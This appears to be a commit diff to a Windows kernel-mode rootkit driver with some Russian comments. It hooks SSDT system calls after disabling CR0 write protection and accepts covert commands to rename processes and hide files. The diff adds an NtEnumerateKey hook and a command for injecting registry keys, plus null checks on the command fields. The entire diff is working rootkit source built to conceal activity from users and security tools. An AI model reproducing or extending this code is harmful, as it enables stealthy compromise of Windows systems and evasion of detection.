@@ -3,6 +3,7 @@
 #include "command.h"
 #include "net.h"
 #include "file.h"
+#include "key.h"
 
 typedef struct _KSERVICE_TABLE_DESCRIPTOR {
     PULONG_PTR Base;        // массив адресов системных вызовов(сервисов)
@@ -71,11 +72,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     glRealNtCreateIoCompletion = (NT_CREATE_IO_COMPLETION)KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION];
     glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];
     glRealNtQueryDirectoryFile = (NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE];
+    glRealNtEnumerateKey = (NT_ENUMERATE_KEY)KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY];
 
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)HookNtCreateIoCompletion;
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)HookNtQueryDirectoryFile;
+    KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)HookNtEnumerateKey;
     WriteCR0(reg);
 
     // Init task list for rename process
@@ -86,6 +89,11 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     // Init task list for hide file
     ExInitializePagedLookasideList(&glPagedTaskQueueFile, NULL, NULL, 0, sizeof(TASK_QUEUE_FILE), ' LFO', 0);
     InitializeListHead(&glTaskQueueFile);
+    //
+
+    // Init task list for add key
+    ExInitializePagedLookasideList(&glPagedTaskQueueKey, NULL, NULL, 0, sizeof(TASK_QUEUE_KEY), ' LFO', 0);
+    InitializeListHead(&glTaskQueueKey);
     //
 
     // Init splicing hook IRP for net
@@ -117,15 +125,23 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)glRealNtCreateIoCompletion;
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)glRealNtQueryDirectoryFile;
+    KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)glRealNtEnumerateKey;
     WriteCR0(reg);
 
     //free list for rename process
     FreeListQueueProcess();
     ExDeletePagedLookasideList(&glPagedTaskQueueProcess);
+    //
 
     //free list for hide file
     FreeListQueueFilename();
     ExDeletePagedLookasideList(&glPagedTaskQueueFile);
+    //
+
+    //free list for add key
+    FreeTaskQueueKeyList();
+    ExDeletePagedLookasideList(&glPagedTaskQueueKey);
+    //
 
     return;
 }
@@ -147,13 +163,13 @@ ULONG_PTR HookNtCreateIoCompletion(
         else if (pCmd->flags & COMMAND_RENAME_PROCESS) {
             ULONG len;
 
-            if (pCmd->flags & COMMAND_BUFFER_NUMBER) {
+            if (pCmd->flags & COMMAND_BUFFER_NUMBER && pCmd->change != NULL) {
 
                 DbgPrint("RenameProcess PID:%d change:%s\n", (ULONG)pCmd->target, (PCHAR)pCmd->change);
                 TaskQueueByPID((ULONG)pCmd->target, (PCHAR)pCmd->change);
 
             }
-            else if (pCmd->flags & COMMAND_BUFFER_POINTER) {
+            else if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL && pCmd->change != NULL) {
 
                 DbgPrint("RenameProcess name:%s change:%s\n", (PCHAR)pCmd->target, (PCHAR)pCmd->change);
                 TaskQueueByName((PCHAR)pCmd->target, (PCHAR)pCmd->change);
@@ -161,17 +177,28 @@ ULONG_PTR HookNtCreateIoCompletion(
             }
         }
         else if (pCmd->flags & COMMAND_HIDE_FILE) {
-            if (pCmd->flags & COMMAND_BUFFER_POINTER) {
-                //DbgPrint("Hide file command for %s\n", (PCHAR)pCmd->target);
+            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL) {
+                
+                DbgPrint("Hide file command for %s\n", (PCHAR)pCmd->target);
                 TaskQueueByFilename((PCHAR)pCmd->target);
+
             }
 
+        }
+        else if (pCmd->flags & COMMAND_ADD_KEY) {
+            if (pCmd->flags & COMMAND_BUFFER_POINTER && pCmd->target != NULL && pCmd->change != NULL) {
+
+                DbgPrint("For key:%s add key:%s\n", (PCHAR)pCmd->target, (PCHAR)pCmd->change);
+                TaskQueueByKey((PCHAR)pCmd->target, (PCHAR)pCmd->change);
+
+            }
         }
         else {
             DbgPrint("No dispatch for command with flag %d\n", pCmd->flags);
         }
         //PrintTaskQueueProcessList();
-        PrintTaskQueueFileList();
+        //PrintTaskQueueFileList();
+        //PrintTaskQueueKeyList();
     }
     else {
         retStatus = glRealNtCreateIoCompletion(
